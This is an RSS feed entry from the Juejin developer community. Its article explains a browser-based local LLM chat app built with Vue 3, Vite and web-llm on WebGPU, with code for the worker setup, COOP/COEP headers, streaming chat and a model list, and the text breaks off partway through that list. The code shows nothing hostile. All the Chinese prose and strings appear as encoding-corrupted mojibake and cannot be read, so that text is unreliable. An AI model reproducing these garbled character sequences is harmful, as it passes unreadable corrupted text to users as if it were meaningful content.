<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¤§æ¨¡å‹ï¼šåŸºäº WebGPU çš„æœ¬åœ° LLM åº”ç”¨æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7594303825013833743</link>    <guid>https://juejin.cn/post/7594303825013833743</guid>    <pubDate>2026-01-13T01:31:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303825013833743" data-draft-id="7594303825013817359" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¤§æ¨¡å‹ï¼šåŸºäº WebGPU çš„æœ¬åœ° LLM åº”ç”¨æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T01:31:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èœå–µ007"/> <meta itemprop="url" content="https://juejin.cn/user/3349527784076185"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¤§æ¨¡å‹ï¼šåŸºäº WebGPU çš„æœ¬åœ° LLM åº”ç”¨æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349527784076185/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èœå–µ007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:31:57.000Z" title="Tue Jan 13 2026 01:31:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¤§æ¨¡å‹ï¼šåŸºäº WebGPU çš„æœ¬åœ° LLM åº”ç”¨æ·±åº¦è§£æ</h2>
<blockquote>
<p>ä»“åº“åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fftcvictory%2Flocal-llm" target="_blank" title="https://github.com/ftcvictory/local-llm" ref="nofollow noopener noreferrer">GitHubä»“åº“</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flefan_suitable%2Flocal-llm" target="_blank" title="https://gitee.com/lefan_suitable/local-llm" ref="nofollow noopener noreferrer">Giteeä»“åº“</a>
æ‰€æœ‰ä»£ç å‡ä½¿ç”¨ <strong>Antigravity IDE</strong> å¼€å‘ï¼Œæ¨¡å‹ä¸º <strong>Gemini 3 Pro</strong></p>
</blockquote>
<h3 data-id="heading-1">æ‘˜è¦</h3>
<p>æœ¬æ–‡æ·±å…¥å‰–æäº†ä¸€ä¸ªå®Œå…¨è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„æœ¬åœ°å¤§è¯­è¨€æ¨¡å‹åº”ç”¨ã€‚è¯¥é¡¹ç›®ä½¿ç”¨ Vue 3 + TypeScript æ„å»ºï¼ŒåŸºäº @mlc-ai/web-llm å®ç° WebGPU åŠ é€Ÿæ¨ç†ï¼Œè®©ç”¨æˆ·æ— éœ€æœåŠ¡å™¨å³å¯åœ¨æµè§ˆå™¨ä¸­ä¸ AI è¿›è¡Œéšç§ä¿æŠ¤çš„å¯¹è¯ã€‚é¡¹ç›®å±•ç¤ºäº†ç°ä»£ Web æŠ€æœ¯åœ¨æœºå™¨å­¦ä¹ é¢†åŸŸçš„å¼ºå¤§èƒ½åŠ›ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡åˆç†çš„æ¶æ„è®¾è®¡å®ç°æµç•…çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€é¡¹ç›®æ¦‚è¿°</h3>
<h4 data-id="heading-3">1.1 èƒŒæ™¯ä¸åŠ¨æœº</h4>
<p>éšç€å¤§è¯­è¨€æ¨¡å‹çš„æ™®åŠï¼Œéšç§å’Œæ•°æ®å®‰å…¨æˆä¸ºç”¨æˆ·çš„æ ¸å¿ƒå…³åˆ‡ã€‚ä¼ ç»Ÿçš„ AI åº”ç”¨éœ€è¦å°†ç”¨æˆ·æ•°æ®ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå­˜åœ¨æ½œåœ¨çš„éšç§é£é™©ã€‚<strong>Local LLM</strong> é¡¹ç›®æ—¨åœ¨è§£å†³è¿™ä¸€ç—›ç‚¹ï¼Œé€šè¿‡ WebGPU æŠ€æœ¯å°†å®Œæ•´çš„è¯­è¨€æ¨¡å‹åŠ è½½åˆ°æµè§ˆå™¨ä¸­ï¼Œå®ç°ï¼š</p>
<ul>
<li>ğŸ”’ <strong>å®Œå…¨æœ¬åœ°åŒ–</strong>ï¼šæ‰€æœ‰å¯¹è¯æ•°æ®ä¸ç¦»å¼€ç”¨æˆ·è®¾å¤‡</li>
<li>âš¡ <strong>GPU åŠ é€Ÿ</strong>ï¼šåˆ©ç”¨ WebGPU æä¾›æ¥è¿‘åŸç”Ÿçš„æ¨ç†æ€§èƒ½</li>
<li>ğŸ’¬ <strong>å¤šè½®å¯¹è¯</strong>ï¼šæ”¯æŒä¸Šä¸‹æ–‡è®°å¿†çš„è¿ç»­å¯¹è¯</li>
<li>ğŸŒ <strong>è·¨å¹³å°</strong>ï¼šä»»ä½•æ”¯æŒ WebGPU çš„ç°ä»£æµè§ˆå™¨å‡å¯ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-4">1.2 æŠ€æœ¯æ ˆ</h4>



































<table><thead><tr><th>æŠ€æœ¯</th><th>ç‰ˆæœ¬</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>Vue 3</td><td>^3.5.24</td><td>å‰ç«¯æ¡†æ¶</td></tr><tr><td>TypeScript</td><td>~5.9.3</td><td>ç±»å‹å®‰å…¨</td></tr><tr><td>Vite</td><td>^7.2.4</td><td>æ„å»ºå·¥å…·</td></tr><tr><td>@mlc-ai/web-llm</td><td>^0.2.80</td><td>WebGPU LLM å¼•æ“</td></tr><tr><td>marked</td><td>^17.0.1</td><td>Markdown æ¸²æŸ“</td></tr></tbody></table>
<h3 data-id="heading-5">äºŒã€æ ¸å¿ƒæ¶æ„è®¾è®¡</h3>
<h4 data-id="heading-6">2.1 æ•´ä½“æ¶æ„</h4>
<p>é¡¹ç›®é‡‡ç”¨å…¸å‹çš„<strong>ç»„ä»¶åŒ– Vue åº”ç”¨æ¶æ„</strong>ï¼Œæ ¸å¿ƒåˆ†ä¸ºä¸‰å±‚ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        ChatTerminal<span class="hljs-selector-class">.vue</span>             â”‚  â† UI å±‚
â”‚   (ä¸»ç•Œé¢ã€æ¶ˆæ¯å±•ç¤ºã€è¾“å…¥å¤„ç†)      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚       useLocalLLM<span class="hljs-selector-class">.ts</span>                â”‚  â† é€»è¾‘å±‚
â”‚   (çŠ¶æ€ç®¡ç†ã€å¼•æ“é€šä¿¡ã€é…ç½®ç®¡ç†)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚       llm<span class="hljs-selector-class">.worker</span><span class="hljs-selector-class">.ts</span>                 â”‚  â† è®¡ç®—å±‚
â”‚   (WebGPU å¼•æ“ã€æ¨¡å‹æ¨ç†)           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-7">2.2 ç›®å½•ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash">src/
â”œâ”€â”€ components/           <span class="hljs-comment"># UI ç»„ä»¶</span>
â”‚   â”œâ”€â”€ ChatTerminal.vue     <span class="hljs-comment"># ä¸»èŠå¤©ç•Œé¢</span>
â”‚   â”œâ”€â”€ MessageItem.vue      <span class="hljs-comment"># å•æ¡æ¶ˆæ¯ç»„ä»¶</span>
â”‚   â”œâ”€â”€ SettingsPanel.vue    <span class="hljs-comment"># è®¾ç½®é¢æ¿</span>
â”‚   â””â”€â”€ ExportDialog.vue     <span class="hljs-comment"># å¯¼å‡ºå¯¹è¯åŠŸèƒ½</span>
â”œâ”€â”€ composables/          <span class="hljs-comment"># ç»„åˆå¼ API</span>
â”‚   â””â”€â”€ useLocalLLM.ts       <span class="hljs-comment"># æ ¸å¿ƒä¸šåŠ¡é€»è¾‘</span>
â”œâ”€â”€ workers/              <span class="hljs-comment"># Web Worker</span>
â”‚   â””â”€â”€ llm.worker.ts        <span class="hljs-comment"># LLM å¼•æ“çº¿ç¨‹</span>
â”œâ”€â”€ utils/                <span class="hljs-comment"># å·¥å…·å‡½æ•°</span>
â”‚   â””â”€â”€ storage.ts           <span class="hljs-comment"># æœ¬åœ°å­˜å‚¨</span>
â”œâ”€â”€ types.ts              <span class="hljs-comment"># ç±»å‹å®šä¹‰</span>
â””â”€â”€ App.vue               <span class="hljs-comment"># æ ¹ç»„ä»¶</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€å…³é”®æŠ€æœ¯å®ç°</h3>
<h4 data-id="heading-9">3.1 WebGPU å¼•æ“åˆå§‹åŒ–</h4>
<p>é¡¹ç›®çš„æ ¸å¿ƒæ˜¯ <strong>@mlc-ai/web-llm</strong>ï¼Œä¸€ä¸ªæ”¯æŒåœ¨æµè§ˆå™¨ä¸­è¿è¡Œé‡åŒ–å¤§æ¨¡å‹çš„åº“ã€‚åˆå§‹åŒ–è¿‡ç¨‹åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š</p>
<h5 data-id="heading-10">3.1.1 Web Worker åˆ›å»º</h5>
<p>ä¸ºé¿å…é˜»å¡ä¸»çº¿ç¨‹ï¼Œæ¨¡å‹åŠ è½½å’Œæ¨ç†åœ¨ç‹¬ç«‹ Worker ä¸­è¿è¡Œï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/workers/llm.worker.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WebWorkerMLCEngineHandler</span>, <span class="hljs-title class_">MLCEngine</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@mlc-ai/web-llm"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ã€Workerçº¿ç¨‹ã€‘è„šæœ¬åŠ è½½æˆåŠŸï¼Œå‡†å¤‡åˆå§‹åŒ–..."</span>);

<span class="hljs-comment">// åˆ›å»ºå¼•æ“å®ä¾‹</span>
<span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MLCEngine</span>();

<span class="hljs-comment">// åˆ›å»ºæ¶ˆæ¯å¤„ç†å™¨</span>
<span class="hljs-keyword">const</span> handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebWorkerMLCEngineHandler</span>(engine);

onmessage = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
  handler.<span class="hljs-title function_">onmessage</span>(msg);
};
</code></pre>
<h5 data-id="heading-11">3.1.2 ä¸»çº¿ç¨‹å¼•æ“åˆå§‹åŒ–</h5>
<p>åœ¨ç»„åˆå¼ API ä¸­å°è£…å¼•æ“åˆ›å»ºé€»è¾‘ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/composables/useLocalLLM.ts (ç®€åŒ–ç‰ˆ)</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">initEngine</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ£€æŸ¥ WebGPU æ”¯æŒ</span>
    <span class="hljs-keyword">if</span> (!navigator.<span class="hljs-property">gpu</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ WebGPU"</span>);
    }

    <span class="hljs-comment">// åˆ›å»º Worker å®ä¾‹</span>
    <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LLMWorker</span>();

    <span class="hljs-comment">// åˆ›å»ºè·¨çº¿ç¨‹çš„ MLC å¼•æ“</span>
    engine = <span class="hljs-keyword">await</span> <span class="hljs-title class_">CreateWebWorkerMLCEngine</span>(
      worker,
      config.<span class="hljs-property">value</span>.<span class="hljs-property">modelConfig</span>.<span class="hljs-property">modelName</span>,
      {
        <span class="hljs-attr">initProgressCallback</span>: <span class="hljs-function">(<span class="hljs-params">report</span>) =&gt;</span> {
          loadProgress.<span class="hljs-property">value</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(report.<span class="hljs-property">progress</span> * <span class="hljs-number">100</span>);
          loadStatus.<span class="hljs-property">value</span> = report.<span class="hljs-property">text</span>;
        },
      }
    );

    isLoaded.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"âœ… æ¨¡å‹åŠ è½½æˆåŠŸ"</span>);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"âŒ æ¨¡å‹åŠ è½½å¤±è´¥:"</span>, err);
    loadError.<span class="hljs-property">value</span> = err.<span class="hljs-property">message</span>;
  }
};
</code></pre>
<blockquote>
<p>[!IMPORTANT] &gt; <strong>å…³é”®é…ç½®</strong>ï¼šWebGPU éœ€è¦ç‰¹å®šçš„ HTTP å“åº”å¤´æ‰èƒ½æ­£å¸¸å·¥ä½œã€‚</p>
</blockquote>
<h5 data-id="heading-12">3.1.3 Vite é…ç½®</h5>
<p>åœ¨ <code>vite.config.ts</code> ä¸­æ·»åŠ å¿…è¦çš„å“åº”å¤´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">vue</span>()],

  <span class="hljs-comment">// é¢„æ„å»º web-llm ä¾èµ–</span>
  <span class="hljs-attr">optimizeDeps</span>: {
    <span class="hljs-attr">include</span>: [<span class="hljs-string">"@mlc-ai/web-llm"</span>],
  },

  <span class="hljs-attr">server</span>: {
    <span class="hljs-comment">// ğŸ”‘ æ ¸å¿ƒï¼šé…ç½® COOP/COEP å“åº”å¤´</span>
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">"Cross-Origin-Opener-Policy"</span>: <span class="hljs-string">"same-origin"</span>,
      <span class="hljs-string">"Cross-Origin-Embedder-Policy"</span>: <span class="hljs-string">"require-corp"</span>,
    },
  },

  <span class="hljs-attr">worker</span>: {
    <span class="hljs-attr">format</span>: <span class="hljs-string">"es"</span>,
  },
});
</code></pre>
<blockquote>
<p>[!WARNING]
ç¼ºå°‘ <code>Cross-Origin-Opener-Policy</code> å’Œ <code>Cross-Origin-Embedder-Policy</code> å“åº”å¤´ä¼šå¯¼è‡´ SharedArrayBuffer ä¸å¯ç”¨ï¼ŒWebGPU Worker æ— æ³•æ­£å¸¸è¿è¡Œã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-13">3.2 æµå¼å¯¹è¯ç”Ÿæˆ</h4>
<p>ä¸ºäº†æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œåº”ç”¨é‡‡ç”¨äº†<strong>æµå¼å“åº”</strong>ï¼ˆStreamingï¼‰æ–¹å¼ï¼Œå³ AI çš„å›å¤é€å­—æ˜¾ç¤ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/composables/useLocalLLM.ts</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">content: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">if</span> (!engine || isGenerating.<span class="hljs-property">value</span> || !content.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 1. æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">userMessage</span>: <span class="hljs-title class_">Message</span> = {
    <span class="hljs-attr">id</span>: <span class="hljs-title function_">generateId</span>(),
    <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>,
    <span class="hljs-attr">content</span>: content.<span class="hljs-title function_">trim</span>(),
    <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
  };
  messages.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>(userMessage);

  <span class="hljs-comment">// 2. åˆ›å»º AI æ¶ˆæ¯å ä½ç¬¦</span>
  <span class="hljs-keyword">const</span> aiMessageIndex = messages.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>;
  messages.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">id</span>: <span class="hljs-title function_">generateId</span>(),
    <span class="hljs-attr">role</span>: <span class="hljs-string">"assistant"</span>,
    <span class="hljs-attr">content</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
  });

  isGenerating.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 3. æ„å»ºå®Œæ•´å¯¹è¯ä¸Šä¸‹æ–‡</span>
    <span class="hljs-keyword">const</span> chatMessages = [];

    <span class="hljs-comment">// æ·»åŠ ç³»ç»Ÿæç¤ºè¯</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">value</span>.<span class="hljs-property">systemPrompt</span>.<span class="hljs-title function_">trim</span>()) {
      chatMessages.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">role</span>: <span class="hljs-string">"system"</span>,
        <span class="hljs-attr">content</span>: config.<span class="hljs-property">value</span>.<span class="hljs-property">systemPrompt</span>,
      });
    }

    <span class="hljs-comment">// æ·»åŠ å†å²å¯¹è¯</span>
    messages.<span class="hljs-property">value</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (msg.<span class="hljs-property">role</span> !== <span class="hljs-string">"system"</span> &amp;&amp; msg.<span class="hljs-property">content</span>.<span class="hljs-title function_">trim</span>()) {
        chatMessages.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">role</span>: msg.<span class="hljs-property">role</span>,
          <span class="hljs-attr">content</span>: msg.<span class="hljs-property">content</span>,
        });
      }
    });

    <span class="hljs-comment">// 4. æµå¼ç”Ÿæˆ</span>
    <span class="hljs-keyword">const</span> chunks = <span class="hljs-keyword">await</span> engine.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">messages</span>: chatMessages,
      <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">temperature</span>: config.<span class="hljs-property">value</span>.<span class="hljs-property">modelConfig</span>.<span class="hljs-property">temperature</span>,
      <span class="hljs-attr">top_p</span>: config.<span class="hljs-property">value</span>.<span class="hljs-property">modelConfig</span>.<span class="hljs-property">topP</span>,
      <span class="hljs-attr">max_tokens</span>: config.<span class="hljs-property">value</span>.<span class="hljs-property">modelConfig</span>.<span class="hljs-property">maxTokens</span>,
    });

    <span class="hljs-comment">// 5. é€å—æ¥æ”¶å¹¶æ›´æ–° UI</span>
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> chunk <span class="hljs-keyword">of</span> chunks) {
      <span class="hljs-keyword">const</span> delta = chunk.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">delta</span>?.<span class="hljs-property">content</span> || <span class="hljs-string">""</span>;
      messages.<span class="hljs-property">value</span>[aiMessageIndex].<span class="hljs-property">content</span> += delta;
    }
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"âŒ ç”Ÿæˆå¤±è´¥:"</span>, err);
    messages.<span class="hljs-property">value</span>[aiMessageIndex].<span class="hljs-property">content</span> = <span class="hljs-string">`âš ï¸ ç”Ÿæˆå¤±è´¥: <span class="hljs-subst">${err.message}</span>`</span>;
  } <span class="hljs-keyword">finally</span> {
    isGenerating.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-title function_">saveChatHistory</span>(messages.<span class="hljs-property">value</span>);
  }
};
</code></pre>
<p><strong>æµå¼ç”Ÿæˆçš„ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>âœ… ç”¨æˆ·æ— éœ€ç­‰å¾…å®Œæ•´å“åº”ï¼Œç«‹å³çœ‹åˆ°è¾“å‡º</li>
<li>âœ… æä¾›ç±»ä¼¼æ‰“å­—æœºæ•ˆæœï¼Œæ”¹å–„äº¤äº’ä½“éªŒ</li>
<li>âœ… å¯éšæ—¶ä¸­æ–­ç”Ÿæˆè¿‡ç¨‹</li>
</ul>
<hr/>
<h4 data-id="heading-14">3.3 å¤šæ¨¡å‹æ”¯æŒ</h4>
<p>åº”ç”¨å†…ç½®äº†ä¸‰ç§ä¸åŒè§„æ¨¡çš„æ¨¡å‹ï¼Œç”¨æˆ·å¯æ ¹æ®æ€§èƒ½éœ€æ±‚åˆ‡æ¢ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/types.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AVAILABLE_MODELS</span> = [
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"Qwen2.5-1.5B-Instruct-q4f32_1-MLC"</span>,
    <span class="hljs-attr">displayName</span>: <span class="hljs-string">"Qwen 2.5 1.5B (å¿«é€Ÿ)"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"è½»é‡çº§æ¨¡å‹ï¼ŒåŠ è½½å¿«é€Ÿï¼Œé€‚åˆæ—¥å¸¸å¯¹è¯"</span>,
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"Llama-3-8B-Instruct-q4f32_1-MLC"</span>,
    <span class="hljs-attr">displayName</span>: <span class="hljs-string">"Llama 3 8B (å¼ºå¤§)"</span>,
